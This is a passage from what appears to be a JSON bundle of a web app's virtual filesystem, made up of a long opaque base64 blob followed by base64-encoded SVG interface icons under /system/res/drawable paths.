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", "/system/res/drawable/skipNext.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNNiAxOGw4LjUtNkw2IDZ2MTJ6TTE2IDZ2MTJoMlY2aC0yeiIvPg0KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4NCjwvc3ZnPg==", "/system/res/drawable/musicLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTIwIDJIOGMtMS4xIDAtMiAuOS0yIDJ2MTJjMCAxLjEuOSAyIDIgMmgxMmMxLjEgMCAyLS45IDItMlY0YzAtMS4xLS45LTItMi0yem0tMiA1aC0zdjUuNWMwIDEuMzgtMS4xMiAyLjUtMi41IDIuNVMxMCAxMy44OCAxMCAxMi41czEuMTItMi41IDIuNS0yLjVjLjU3IDAgMS4wOC4xOSAxLjUuNTFWNWg0djJ6TTQgNkgydjE0YzAgMS4xLjkgMiAyIDJoMTR2LTJINFY2eiIvPg0KPC9zdmc+", "/system/res/drawable/createLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMyAxNy4yNVYyMWgzLjc1TDE3LjgxIDkuOTRsLTMuNzUtMy43NUwzIDE3LjI1ek0yMC43MSA3LjA0Yy4zOS0uMzkuMzktMS4wMiAwLTEuNDFsLTIuMzQtMi4zNGMtLjM5LS4zOS0xLjAyLS4zOS0xLjQxIDBsLTEuODMgMS44MyAzLjc1IDMuNzUgMS44My0xLjgzeiIvPg0KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4NCjwvc3ZnPg==", "/system/res/styles": {}, "/system/res/drawable/pauseCircle.svg": 